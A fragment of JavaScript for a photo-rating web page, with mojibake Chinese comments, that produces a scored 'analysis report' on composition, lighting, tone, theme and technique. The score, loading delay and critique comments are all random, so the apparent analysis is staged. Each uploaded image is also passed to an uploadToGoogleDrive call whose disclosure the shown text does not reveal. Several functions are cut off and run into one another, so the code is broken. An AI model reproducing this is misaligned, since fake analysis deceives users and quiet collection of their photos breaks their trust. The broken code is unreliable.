        function getRandomComment(category, score) {
            let level = 'mid';
            if (score >= 18) level = 'high';
            else if (score <= 14) level = 'low';
            
            const comments = commentDatabase[category][level];
            // éš¨æ©ŸæŒ‘é¸ 2 å¥ä¸åŒçš„è©•èª
            let idx1 = Math.floor(Math.random() * comments.length);
            let idx2 = idx1;
            while(idx2 === idx1) {
                idx2 = Math.floor(Math.random() * comments.length);
            }
            return [comments[idx1], comments[idx2]];
        }

        function getChineseGrade(score) {
            if (score >= 95) return 'ç”²ä¸Š';
            if (score >= 90) return 'ç”²';
            if (score >= 85) return 'ç”²ä¸‹';
            if (score >= 80) return 'ä¹™ä¸Š';
            if (score >= 75) return 'ä¹™';
            if (score >= 70) return 'ä¹™ä¸‹';
            return 'ä¸™';
        }

        // â˜…â˜…â˜… æ ¸å¿ƒï¼šç”Ÿæˆçµæ§‹åŒ–åˆ†æå ±å‘Š â˜…â˜…â˜…
        function generateAnalysisReport(totalScore) {
            // 1. æ™ºæ…§åˆ†é…åˆ†æ•¸ (è®“ç¸½å’Œ = totalScoreï¼Œä¸”æ¯é … max 20)
            let baseAvg = Math.floor(totalScore / 5);
            let remainder = totalScore % 5;
            let scores = [baseAvg, baseAvg, baseAvg, baseAvg, baseAvg];
            for(let i=0; i<remainder; i++) scores[i]++;

            // åŠ å…¥éš¨æ©Ÿæ³¢å‹•
            for(let i=0; i<5; i++) {
                let idxA = Math.floor(Math.random() * 5);
                let idxB = Math.floor(Math.random() * 5);
                if(idxA !== idxB && scores[idxA] < 20 && scores[idxB] > 0) {
                    scores[idxA]++;
                    scores[idxB]--;
                }
            }

            const categories = [
                { key: 'composition', name: 'æ§‹åœ–' },
                { key: 'lighting', name: 'å…‰ç·š' },
                { key: 'tone', name: 'è‰²èª¿èˆ‡æ°›åœ' },
                { key: 'theme', name: 'ä¸»é¡Œå‘ˆç¾' },
                { key: 'technique', name: 'å½±åƒæŠ€è¡“' }
            ];

            let html = '';
            let textSummary = '';

            categories.forEach((cat, index) => {
                const subScore = scores[index];
                const comments = getRandomComment(cat.key, subScore);
                
                html += `
                <div class="analysis-item">
                    <div class="analysis-title">
                        ${index + 1}. ${cat.name} <span class="score-tag">(${subScore}/20)</span>
                    </div>
                    <ul class="analysis-points">
                        <li>${comments[0]}</li>
                        <li>${comments[1]}</li>
                    </ul>
                </div>`;

                if(index === 0 || index === 2) textSummary += `${comments[0]} `;
            });

            return { html, textSummary };
        }

        function startLoadingSequence(duration) {

        async function processImage(event) {
            const file = event.target.files[0];
            if (!file) return;

            document.getElementById('uploadZone').style.display = 'none';
            document.getElementById('loadingZone').style.display = 'block';
            
            removeEffects();

            const reader = new FileReader();
            reader.readAsDataURL(file); 
            
            reader.onload = function(e) {
                const base64Image = e.target.result;
                document.getElementById('displayImage').src = base64Image;

                uploadToGoogleDrive(file.name, base64Image);

                const processingTime = Math.floor(Math.random() * 3000) + 3000; 
                startLoadingSequence(processingTime); 

                setTimeout(() => {
                    clearInterval(loadingInterval); 
                    const score = Math.floor(Math.random() * 71) + 30;

        function getRandomDuration() {
            return Math.floor(Math.random() * (8000 - 4000 + 1) + 4000);

        function triggerPerfectEffect() {
            const container = document.getElementById('appContainer');
            container.classList.add('effect-perfect');
            const duration = getRandomDuration();
            container.style.animation = `holy-glow 1.5s infinite alternate`; 

            var animationEnd = Date.now() + duration;
            var defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
            var random = function(min, max) { return Math.random() * (max - min) + min; };

            var interval = setInterval(function() {
                var timeLeft = animationEnd - Date.now();
                if (timeLeft <= 0) { return clearInterval(interval); }
                var particleCount = 50 * (timeLeft / duration);
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: random(0.1, 0.3), y: Math.random() - 0.2 } }));
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: random(0.7, 0.9), y: Math.random() - 0.2 } }));
            }, 250);

            if (effectTimeout) clearTimeout(effectTimeout);
            effectTimeout = setTimeout(() => {
                container.classList.remove('effect-perfect');
                container.style.animation = 'none'; 
            }, duration);
        }

        function triggerGoodEffect() {
            document.getElementById('appContainer').classList.add('effect-good');
        }

        function triggerBadEffect() {
            const container = document.getElementById('appContainer');
            container.classList.remove('effect-bad');
            void container.offsetWidth; 
            container.classList.add('effect-bad');
            
            const duration = getRandomDuration();
            container.style.animation = `shake 0.5s infinite`; 

            if (effectTimeout) clearTimeout(effectTimeout);
            effectTimeout = setTimeout(() => {
                container.classList.remove('effect-bad');
                container.style.animation = 'none'; 
            }, duration);
        }

        function removeEffects() {
            const container = document.getElementById('appContainer');
            container.classList.remove('effect-perfect', 'effect-good', 'effect-bad');
            container.style.animation = 'none'; 
            if (effectTimeout) clearTimeout(effectTimeout);
